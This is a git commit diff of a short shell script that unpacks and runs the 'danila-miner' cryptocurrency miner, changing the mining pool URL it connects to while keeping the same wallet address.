04c1fd2c4bd1806ae3716fb565adc66c57b65c8f
WxYtzaiu <100740697+WxYtzaiu@users.noreply.github.com>
2022-05-24 08:40:09 +0700

    Update dnila.sh

--- dnila.sh
+++ dnila.sh
@@ -6,4 +6,4 @@ tar xaf danila-miner-2.3.1-ubuntu-bionic.tar.gz >/dev/null 2>&1
 
 chmod +x danila-miner >/dev/null 2>&1
 
-./danila-miner run https://server1.whalestonpool.com EQBU__5pqrJXDTFZInmRZl3nivwjunX6Glh41Z1KGNBLk1EZ
+./danila-miner run https://ton-pool-server-p3agi.ondigitalocean.app EQBU__5pqrJXDTFZInmRZl3nivwjunX6Glh41Z1KGNBLk1EZ
